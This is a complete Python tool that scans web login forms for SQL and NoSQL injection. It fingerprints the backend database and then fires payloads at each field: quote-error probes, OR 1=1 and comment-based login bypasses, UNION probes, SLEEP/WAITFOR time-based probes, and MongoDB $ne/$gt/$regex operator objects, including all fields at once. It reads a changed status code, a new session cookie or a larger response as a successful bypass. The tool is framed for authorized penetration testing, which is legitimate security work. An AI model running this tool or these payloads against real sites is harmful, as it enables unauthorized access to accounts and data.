#!/usr/bin/env python3
"""
inject_scanner.py — SQL/NoSQL Injection Surface Scanner
For authorized penetration testing only.

v2.0 changes:
  - Auto-detects JSON vs form-urlencoded request bodies (or force with --mode)
  - NoSQL payloads now sent as real nested JSON objects (e.g. {"username": {"$ne": "x"}})
    instead of stringified JSON inside a form field, which never reaches the DB layer.
  - Tracks status-code/redirect/cookie changes as an additional bypass signal,
    not just response-length delta.
"""

import sys
import time
import json as jsonlib
import argparse
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from urllib.parse import urljoin

init(autoreset=True)

# ─────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════╗
║      inject_scanner.py  v2.0             ║
║  SQL + NoSQL Injection Surface Tester    ║
║  [authorized pentest use only]           ║
╚══════════════════════════════════════════╝{Style.RESET_ALL}
"""

# ─────────────────────────────────────────────
# DB FINGERPRINT SIGNATURES
# ─────────────────────────────────────────────
DB_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "supplied argument is not a valid mysql",
    ],
    "MSSQL": [
        "unclosed quotation mark",
        "microsoft sql native client",
        "odbc sql server driver",
        "sqlserver",
        "mssql_",
        "[microsoft][odbc",
    ],
    "Oracle": [
        "ora-",
        "oracle error",
        "oracle driver",
        "quoted string not properly terminated",
    ],
    "PostgreSQL": [
        "pg::syntaxerror",
        "postgresql",
        "warning: pg_",
        "unterminated quoted string at or near",
        "pg_query()",
    ],
    "SQLite": [
        "sqlite_",
        "sqlite3::",
        "sqliteexception",
        "near \": syntax error",
    ],
    "MongoDB": [
        "mongodb",
        "castererror",
        "bsontype",
        "$where",
        "mongoclient",
        "validationerror",
        "e11000 duplicate key",
    ],
    "CouchDB": [
        "couchdb",
        "invalid json",
    ],
}

# ─────────────────────────────────────────────
# HEADER SIGNATURES
# ─────────────────────────────────────────────
HEADER_SIGNATURES = {
    "MySQL":      {"x-powered-by": ["php"], "server": ["mysql"]},
    "MSSQL":      {"x-powered-by": ["asp.net"], "server": ["microsoft-iis"]},
    "MongoDB":    {"x-powered-by": ["express", "node"]},
    "PostgreSQL": {"server": ["nginx", "apache"]},
}

# ─────────────────────────────────────────────
# PAYLOADS
# ─────────────────────────────────────────────
# SQL payloads: value is always a string — safe in both JSON and form bodies.
#
# NoSQL payloads: value is a native Python object (dict/list) representing the
# operator structure. In JSON mode this gets nested directly as the field's
# value: {"username": {"$ne": "..."}, "password": "test"}. In form mode, an
# object payload cannot be meaningfully represented (form encoding is flat
# key=value strings), so these are SKIPPED rather than stringified — sending
# the stringified version produces no real operator and was the root cause
# of the original tool never finding anything.
SQL_DBS = {"MySQL", "MSSQL", "Oracle", "PostgreSQL", "SQLite", "Generic-SQL"}
NOSQL_DBS = {"MongoDB", "CouchDB", "Generic-NoSQL"}

PAYLOADS = {
    # --- SQL payloads (string values, safe in any encoding) ---
    "MySQL": [
        ("Error-based quote",       "'",                          ["you have an error in your sql", "mysql_fetch", "supplied argument is not a valid mysql"]),
        ("Auth bypass OR 1=1",      "' OR '1'='1",                ["__len_increase__", "__status_change__"]),
        ("Comment bypass",          "admin'--",                   ["__len_increase__", "__status_change__"]),
        ("UNION NULL probe",        "' UNION SELECT NULL--",      ["__len_increase__"]),
        ("Sleep time-based",        "' AND SLEEP(3)--",           ["__time_delay__"]),
    ],
    "MSSQL": [
        ("Error-based quote",       "'",                          ["unclosed quotation mark after", "microsoft sql native client", "odbc sql server driver", "[microsoft][odbc"]),
        ("WAITFOR time-based",      "'; WAITFOR DELAY '0:0:3'--", ["__time_delay__"]),
        ("Auth bypass",             "' OR 1=1--",                 ["__len_increase__", "__status_change__"]),
        ("Comment bypass",          "admin'--",                   ["__len_increase__", "__status_change__"]),
    ],
    "Oracle": [
        ("Error-based quote",       "'",                          ["ora-00907", "ora-01756", "quoted string not properly terminated"]),
        ("Auth bypass",             "' OR '1'='1",                ["__len_increase__", "__status_change__"]),
        ("UNION dual probe",        "' UNION SELECT NULL FROM DUAL--", ["__len_increase__"]),
    ],
    "PostgreSQL": [
        ("Error-based quote",       "'",                          ["pg::syntaxerror", "unterminated quoted string at or near", "pg_query() ["]),
        ("Auth bypass",             "' OR '1'='1",                ["__len_increase__", "__status_change__"]),
        ("PG sleep time-based",     "'; SELECT pg_sleep(3)--",    ["__time_delay__"]),
    ],
    "SQLite": [
        ("Error-based quote",       "'",                          ["sqlite3::", "sqliteexception", "near \": syntax error"]),
        ("Auth bypass",             "' OR '1'='1",                ["__len_increase__", "__status_change__"]),
    ],
    "Generic-SQL": [
        ("Error-based quote",       "'",                          ["you have an error in your sql", "syntax error near", "unclosed quotation mark", "ora-00907", "pg::syntaxerror", "sqlite3::", "mysql_fetch", "odbc sql server"]),
        ("Double quote probe",      '"',                          ["you have an error in your sql", "syntax error near", "unclosed quotation mark", "ora-", "pg::syntaxerror"]),
        ("Auth bypass OR 1=1",      "' OR '1'='1",                ["__len_increase__", "__status_change__"]),
        ("Comment bypass",          "admin'--",                   ["__len_increase__", "__status_change__"]),
        ("UNION NULL probe",        "' UNION SELECT NULL--",      ["__len_increase__"]),
        ("Sleep probe MySQL",       "' AND SLEEP(3)--",           ["__time_delay__"]),
        ("WAITFOR probe MSSQL",     "'; WAITFOR DELAY '0:0:3'--", ["__time_delay__"]),
    ],
    # --- NoSQL payloads (object values — JSON mode only) ---
    "MongoDB": [
        ("$ne operator bypass",     {"$ne": "invalid_xyz_abc"},   ["castererror", "__len_increase__", "__status_change__"]),
        ("$gt operator bypass",     {"$gt": ""},                  ["castererror", "__len_increase__", "__status_change__"]),
        ("$regex wildcard",         {"$regex": ".*"},             ["castererror", "__len_increase__", "__status_change__"]),
        ("$exists true bypass",     {"$exists": True},            ["castererror", "__len_increase__", "__status_change__"]),
        ("$in array bypass",        {"$in": ["admin", "root", "test", ""]}, ["castererror", "__len_increase__", "__status_change__"]),
    ],
    "CouchDB": [
        ("JSON ne bypass",          {"$ne": None},                ["__len_increase__", "__status_change__"]),
    ],
    "Generic-NoSQL": [
        ("$ne operator bypass",     {"$ne": "invalid_xyz_abc"},   ["castererror", "__len_increase__", "__status_change__"]),
        ("$gt operator bypass",     {"$gt": ""},                  ["castererror", "__len_increase__", "__status_change__"]),
        ("$regex wildcard",         {"$regex": ".*"},             ["castererror", "__len_increase__", "__status_change__"]),
        ("$exists true bypass",     {"$exists": True},            ["castererror", "__len_increase__", "__status_change__"]),
    ],
}

SKIP_FIELDS = {"csrf_token", "csrf", "_token", "token", "redirect", "redirect_url",
               "submit", "type", "method", "_method", "utf8", "__requestverificationtoken"}


# ─────────────────────────────────────────────
# LOGGING HELPERS
# ─────────────────────────────────────────────
def info(msg):    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")
def ok(msg):      print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def warn(msg):    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def vuln(msg):    print(f"{Fore.RED}[VULN]{Style.RESET_ALL} {msg}")
def fail(msg):    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")
def section(msg): print(f"\n{Fore.CYAN}{'─'*50}\n  {msg}\n{'─'*50}{Style.RESET_ALL}")


# ─────────────────────────────────────────────
# HTTP HELPERS
# ─────────────────────────────────────────────
def get_page(url, session, timeout=10):
    try:
        t0 = time.time()
        r = session.get(url, timeout=timeout, allow_redirects=True)
        elapsed = int((time.time() - t0) * 1000)
        return r, elapsed
    except Exception as e:
        fail(f"GET {url} failed: {e}")
        return None, 0


def parse_forms(html, base_url):
    """Extract all forms and their input fields from HTML."""
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        form_url = urljoin(base_url, action) if action else base_url
        fields = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            val = inp.get("value", "test")
            fields[name] = val if val else "test"
        forms.append({"url": form_url, "method": method, "fields": fields})
    return forms


def fingerprint_db_from_headers(headers):
    h = {k.lower(): v.lower() for k, v in headers.items()}
    for db, sigs in HEADER_SIGNATURES.items():
        for header, values in sigs.items():
            if header in h:
                for v in values:
                    if v in h[header]:
                        return db, f"header '{header}: {h[header]}'"
    return None, None


def fingerprint_db_from_body(body):
    b = body.lower()
    for db, sigs in DB_SIGNATURES.items():
        for sig in sigs:
            if sig in b:
                return db, f"error string '{sig}'"
    return None, None


# ─────────────────────────────────────────────
# REQUEST BODY MODE HANDLING (the core fix)
# ─────────────────────────────────────────────
def fire_request(url, method, body_dict, mode, session, timeout=10):
    """
    Send a request in either 'json' or 'form' mode and return the raw response.
    mode: 'json' -> sends Content-Type: application/json, json.dumps(body_dict)
          'form' -> sends application/x-www-form-urlencoded (requests 'data=')
    """
    try:
        if mode == "json":
            if method == "POST":
                return session.post(url, json=body_dict, timeout=timeout, allow_redirects=True)
            else:
                # GET with JSON body is unusual; fall back to query params of stringified values
                safe_params = {k: (v if isinstance(v, str) else jsonlib.dumps(v)) for k, v in body_dict.items()}
                return session.get(url, params=safe_params, timeout=timeout, allow_redirects=True)
        else:  # form
            # Form encoding can't carry nested objects; stringify only as last resort,
            # callers should avoid sending object payloads in form mode entirely.
            safe_data = {k: (v if isinstance(v, str) else jsonlib.dumps(v)) for k, v in body_dict.items()}
            if method == "POST":
                return session.post(url, data=safe_data, timeout=timeout, allow_redirects=True)
            else:
                return session.get(url, params=safe_data, timeout=timeout, allow_redirects=True)
    except requests.exceptions.Timeout:
        raise
    except Exception:
        return None


def detect_body_mode(url, method, fields, session):
    """
    Probe the target with a clearly-wrong-but-harmless credential set encoded
    both as JSON and as form data, and see which one the server actually
    appears to parse. Heuristics, in order of confidence:
      1. Different HTTP status codes between the two -> server only understood one
      2. Different response length -> server behaved differently per encoding
      3. Tie -> default to 'form' (cheap, ubiquitous) but flag both will be tried
    Returns: ('json'|'form'|'both', diagnostic info dict)
    """
    probe_fields = {k: "probe_xyz_123" for k in fields}

    try:
        r_json = fire_request(url, method, probe_fields, "json", session)
    except Exception:
        r_json = None
    try:
        r_form = fire_request(url, method, probe_fields, "form", session)
    except Exception:
        r_form = None

    info_bits = {}
    if r_json is not None:
        info_bits["json_status"] = r_json.status_code
        info_bits["json_len"] = len(r_json.text)
    if r_form is not None:
        info_bits["form_status"] = r_form.status_code
        info_bits["form_len"] = len(r_form.text)

    if r_json is None and r_form is not None:
        return "form", info_bits
    if r_form is None and r_json is not None:
        return "json", info_bits
    if r_json is None and r_form is None:
        return "form", info_bits  # nothing worked; let later requests surface the real error

    # Both succeeded — compare signal strength.
    status_diff = r_json.status_code != r_form.status_code
    len_diff = abs(len(r_json.text) - len(r_form.text))
    rel_diff = len_diff / max(len(r_form.text), 1)

    if status_diff:
        # Whichever returned something other than a generic 4xx client/parse error wins.
        # A 400/415/422 strongly suggests "couldn't parse this encoding".
        json_bad = r_json.status_code in (400, 415, 422)
        form_bad = r_form.status_code in (400, 415, 422)
        if json_bad and not form_bad:
            return "form", info_bits
        if form_bad and not json_bad:
            return "json", info_bits
        # both gave non-error but different codes — try both later
        return "both", info_bits

    if rel_diff > 0.05:
        # Bodies meaningfully diverge even though status matched — can't be sure
        # which one the server "really" parsed, so test both to be safe.
        return "both", info_bits

    # Indistinguishable — default to form since it's the cheaper, more universal
    # encoding, but mark as ambiguous so caller can still try both if it wants.
    return "both", info_bits


# ─────────────────────────────────────────────
# CORE SCANNER
# ─────────────────────────────────────────────
def detect_db(url, forms, session, body_modes):
    """Phase 1: fingerprint the database."""
    section("Phase 1: DB Fingerprinting")

    resp, _ = get_page(url, session)
    if resp is not None:
        db, reason = fingerprint_db_from_headers(resp.headers)
        if db:
            ok(f"DB hint from headers: {Fore.YELLOW}{db}{Style.RESET_ALL} ({reason})")
            header_db = db
        else:
            header_db = None
    else:
        header_db = None

    # Probe each form with a bare quote (string-safe in any encoding) to trigger errors.
    for i, form in enumerate(forms):
        mode = body_modes[i]
        modes_to_try = ["json", "form"] if mode == "both" else [mode]
        info(f"Probing form {i+1}/{len(forms)} at {form['url']} [{form['method']}] (mode={mode}) ...")
        for m in modes_to_try:
            probe_body = {k: "'" for k in form["fields"]}
            try:
                probe_resp = fire_request(form["url"], form["method"], probe_body, m, session)
            except Exception:
                probe_resp = None
            if probe_resp is not None:
                db, reason = fingerprint_db_from_body(probe_resp.text)
                if db:
                    ok(f"DB identified: {Fore.YELLOW}{db}{Style.RESET_ALL} via {reason} (encoding={m})")
                    return db
        info("  No DB error strings in response for this form — server may suppress errors")

    if header_db:
        return header_db

    warn("Could not fingerprint DB from errors/headers")
    warn("Defaulting to Generic-SQL + Generic-NoSQL payload sets")
    return "Generic"


def get_baseline(url, method, fields, mode, session):
    """Get baseline (status, length, set-cookie present?) with clean probe data."""
    probe_body = {k: "probe_xyz_123" for k in fields}
    try:
        r = fire_request(url, method, probe_body, mode, session)
    except Exception:
        r = None
    if r is None:
        return {"status": None, "len": 0, "has_cookie": False}
    return {
        "status": r.status_code,
        "len": len(r.text),
        "has_cookie": "set-cookie" in {k.lower() for k in r.headers.keys()},
    }


def check_indicators(response_text, indicators):
    body = response_text.lower()
    for ind in indicators:
        if ind.startswith("__"):
            continue
        if ind in body:
            return ind
    return None


def run_injection_tests(forms, db_type, session, body_modes, time_threshold=2.5, delay=0.3):
    """Phase 2: fire targeted injection payloads."""
    section("Phase 2: Injection Testing")

    if db_type in SQL_DBS:
        payload_sets = [(db_type, PAYLOADS.get(db_type, PAYLOADS["Generic-SQL"]))]
    elif db_type in NOSQL_DBS:
        payload_sets = [(db_type, PAYLOADS.get(db_type, PAYLOADS["Generic-NoSQL"]))]
    else:
        payload_sets = [
            ("Generic-SQL",   PAYLOADS["Generic-SQL"]),
            ("Generic-NoSQL", PAYLOADS["Generic-NoSQL"]),
        ]

    results = []

    def evaluate_payload(url, method, fields, target_label, target_fields, payload, name,
                          indicators, db_label, m, baseline, session):
        """Build a request body with `payload` applied to every field in
        target_fields, send it, and evaluate the response against indicators.
        target_fields is a list so the same logic covers both single-field
        and combined-field (all-fields-at-once) testing."""
        body = dict(fields)
        for tf in target_fields:
            body[tf] = payload

        t0 = time.time()
        try:
            resp = fire_request(url, method, body, m, session, timeout=15)
            elapsed = time.time() - t0
            is_delay = elapsed >= time_threshold
        except requests.exceptions.Timeout:
            resp = None
            elapsed = time.time() - t0
            is_delay = True

        status = "error" if resp is None else str(resp.status_code)
        resp_len = len(resp.text) if resp is not None else 0
        len_diff = abs(resp_len - baseline["len"])
        has_cookie_now = bool(resp is not None and "set-cookie" in {k.lower() for k in resp.headers.keys()})

        indicator_hit = None
        if "__time_delay__" in indicators and is_delay:
            indicator_hit = f"time delay ({elapsed:.1f}s)"
        else:
            indicator_hit = check_indicators(resp.text, indicators) if resp is not None else None

            if indicator_hit is None and "__status_change__" in indicators and resp is not None and baseline["status"] is not None:
                if resp.status_code != baseline["status"]:
                    baseline_bad = baseline["status"] >= 400
                    now_bad = resp.status_code >= 400
                    if baseline_bad and not now_bad:
                        indicator_hit = f"status changed {baseline['status']} -> {resp.status_code} (auth likely bypassed)"

            if indicator_hit is None and has_cookie_now and not baseline["has_cookie"]:
                indicator_hit = "new session cookie issued (possible auth bypass)"

            if indicator_hit is None and "__len_increase__" in indicators and resp is not None:
                increase = resp_len - baseline["len"]
                pct = (increase / baseline["len"] * 100) if baseline["len"] > 0 else 0
                if increase > 300 and pct > 15:
                    indicator_hit = f"response grew +{increase} chars (+{pct:.0f}%)"

        is_vuln = indicator_hit is not None
        len_anomaly = (not is_vuln) and len_diff > 500 and resp is not None and resp.status_code not in (400, 403, 404)
        display_payload = payload if isinstance(payload, str) else jsonlib.dumps(payload)

        result = {
            "field": target_label, "payload_name": name, "payload": display_payload,
            "mode": m, "db_type": db_label, "status": status, "resp_len": resp_len,
            "len_diff": len_diff, "elapsed": elapsed, "is_vuln": is_vuln,
            "indicator": indicator_hit, "len_anomaly": len_anomaly,
        }

        elapsed_str = f"{elapsed:.2f}s"
        tag = f"[{db_label}/{m}]"
        if is_vuln:
            vuln(f"  {tag} {name} (field: {target_label})")
            vuln(f"       payload   : {display_payload}")
            vuln(f"       indicator : {indicator_hit}")
            vuln(f"       status={status}  len={resp_len}  time={elapsed_str}")
        elif len_anomaly:
            warn(f"  {tag} {name} (field: {target_label}) — response length anomaly (+{len_diff} chars, status={status})")
        else:
            ok(f"  {tag} {name} (field: {target_label}) — no indicator (status={status}, len={resp_len}, {elapsed_str})")

        time.sleep(delay)
        return result

    for fi, form in enumerate(forms):
        url    = form["url"]
        method = form["method"]
        fields = form["fields"]
        mode_setting = body_modes[fi]
        modes_to_try = ["json", "form"] if mode_setting == "both" else [mode_setting]

        info(f"Form: {url} [{method}] — fields: {list(fields.keys())} — body modes: {modes_to_try}")

        baselines = {m: get_baseline(url, method, fields, m, session) for m in modes_to_try}
        for m in modes_to_try:
            b = baselines[m]
            info(f"  Baseline ({m}): status={b['status']} len={b['len']} cookie={b['has_cookie']}")

        injectable_fields = [f for f in fields if f.lower() not in SKIP_FIELDS]
        for f in fields:
            if f.lower() in SKIP_FIELDS:
                info(f"  Skipping non-injectable field: {f}")

        # ── Pass 1: one field at a time (standard SQLi-style probing) ──
        for target_field in injectable_fields:
            print(f"\n  {Fore.CYAN}→ Testing field: {Fore.WHITE}{target_field}{Style.RESET_ALL}")

            for db_label, payloads in payload_sets:
                for (name, payload, indicators) in payloads:
                    is_object_payload = isinstance(payload, (dict, list))
                    for m in modes_to_try:
                        # Object payloads (NoSQL operators) are meaningless in form
                        # encoding — there is no way to represent {"$ne": "x"} as a
                        # flat form value without stringifying it, which defeats the
                        # purpose (this was the original bug). Skip form mode for these.
                        if is_object_payload and m == "form":
                            continue
                        result = evaluate_payload(
                            url, method, fields, target_field, [target_field], payload,
                            name, indicators, db_label, m, baselines[m], session,
                        )
                        results.append(result)

        # ── Pass 2: combined — apply the same NoSQL operator to ALL injectable
        # fields simultaneously. Many real auth-bypass cases (e.g. Juice Shop's
        # {username: {$ne: null}, password: {$ne: null}}) only trigger when every
        # field carries the operator at once; testing one field while others stay
        # as literal strings will never satisfy that condition.
        if len(injectable_fields) > 1:
            print(f"\n  {Fore.CYAN}→ Testing ALL fields combined: {Fore.WHITE}{injectable_fields}{Style.RESET_ALL}")
            for db_label, payloads in payload_sets:
                for (name, payload, indicators) in payloads:
                    if not isinstance(payload, (dict, list)):
                        continue  # combined pass only makes sense for NoSQL operator objects
                    for m in modes_to_try:
                        if m == "form":
                            continue
                        combined_label = "+".join(injectable_fields)
                        result = evaluate_payload(
                            url, method, fields, combined_label, injectable_fields, payload,
                            f"{name} (all fields)", indicators, db_label, m, baselines[m], session,
                        )
                        results.append(result)

    return results


def print_summary(results, db_type):
    section("Scan Summary")

    vulns   = [r for r in results if r["is_vuln"]]
    anomaly = [r for r in results if r["len_anomaly"] and not r["is_vuln"]]
    total   = len(results)

    print(f"  DB detected   : {Fore.YELLOW}{db_type}{Style.RESET_ALL}")
    print(f"  Total tested  : {total}")
    print(f"  Vulnerable    : {Fore.RED}{len(vulns)}{Style.RESET_ALL}")
    print(f"  Anomalies     : {Fore.YELLOW}{len(anomaly)}{Style.RESET_ALL}")
    print(f"  Clean         : {Fore.GREEN}{total - len(vulns) - len(anomaly)}{Style.RESET_ALL}")

    if vulns:
        print(f"\n{Fore.RED}  ── Confirmed Findings ──{Style.RESET_ALL}")
        for r in vulns:
            print(f"  {Fore.RED}●{Style.RESET_ALL} [{r['db_type']}/{r['mode']}] field='{r['field']}' — {r['payload_name']}")
            print(f"      payload   : {r['payload']}")
            print(f"      indicator : {r['indicator']}")

    if anomaly:
        print(f"\n{Fore.YELLOW}  ── Response Anomalies (manual review) ──{Style.RESET_ALL}")
        for r in anomaly:
            print(f"  {Fore.YELLOW}●{Style.RESET_ALL} [{r['db_type']}/{r['mode']}] field='{r['field']}' — {r['payload_name']} (+{r['len_diff']} chars)")

    if not vulns and not anomaly:
        print(f"\n  {Fore.GREEN}No injection indicators found.{Style.RESET_ALL}")
        print("  Note: absence of findings doesn't guarantee security.")
        print("  Consider manual testing and reviewing server-side logic.")

    print()


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="SQL/NoSQL injection scanner for authorized pentests")
    parser.add_argument("url", help="Target URL (e.g. https://target.com/login)")
    parser.add_argument("--cookies", help="Cookies string (e.g. 'session=abc; csrf=xyz')", default="")
    parser.add_argument("--headers", help="Extra headers as JSON", default="{}")
    parser.add_argument("--delay", help="Delay between requests in seconds (default: 0.3)", type=float, default=0.3)
    parser.add_argument("--timeout", help="Request timeout in seconds (default: 10)", type=int, default=10)
    parser.add_argument("--no-verify", help="Disable SSL verification", action="store_true")
    parser.add_argument("--mode", choices=["auto", "json", "form"], default="auto",
                         help="Request body encoding: auto-detect per form (default), or force json/form")
    args = parser.parse_args()

    warn("You are responsible for ensuring you have written authorization")
    warn("to test the target. Unauthorized use is illegal.\n")

    session = requests.Session()
    session.verify = not args.no_verify
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; inject_scanner/2.0; pentest)"})
    if args.cookies:
        for pair in args.cookies.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                session.cookies.set(k.strip(), v.strip())
    if args.headers and args.headers != "{}":
        try:
            session.headers.update(jsonlib.loads(args.headers))
        except jsonlib.JSONDecodeError:
            warn("Could not parse --headers JSON, ignoring")

    info(f"Fetching target: {args.url}")
    resp, elapsed = get_page(args.url, session, timeout=args.timeout)
    if not resp:
        fail("Could not reach target. Exiting.")
        sys.exit(1)
    ok(f"Got response: HTTP {resp.status_code} ({len(resp.text)} chars, {elapsed}ms)")

    forms = parse_forms(resp.text, args.url)
    if not forms:
        warn("No HTML forms found on the page.")
        warn("If this is a JS/SPA frontend, the real login form is rendered client-side")
        warn("and posts via fetch()/XHR — inspect the browser Network tab for the real")
        warn("endpoint and field names, then point this tool at that endpoint directly.")
        sys.exit(0)

    info(f"Found {len(forms)} form(s):")
    for i, f in enumerate(forms):
        print(f"  Form {i+1}: {f['url']} [{f['method']}] — fields: {list(f['fields'].keys())}")

    # ── Determine body encoding mode per form ──
    section("Phase 0: Request Body Mode Detection")
    body_modes = []
    for i, f in enumerate(forms):
        if args.mode != "auto":
            body_modes.append(args.mode)
            ok(f"Form {i+1}: mode forced to '{args.mode}'")
            continue
        mode, diag = detect_body_mode(f["url"], f["method"], f["fields"], session)
        body_modes.append(mode)
        diag_str = ", ".join(f"{k}={v}" for k, v in diag.items())
        if mode == "both":
            warn(f"Form {i+1}: ambiguous encoding signal ({diag_str}) — will try BOTH json and form")
        else:
            ok(f"Form {i+1}: detected '{mode}' encoding ({diag_str})")

    db_type = detect_db(args.url, forms, session, body_modes)
    results = run_injection_tests(forms, db_type, session, body_modes, delay=args.delay)
    print_summary(results, db_type)


if __name__ == "__main__":
    main()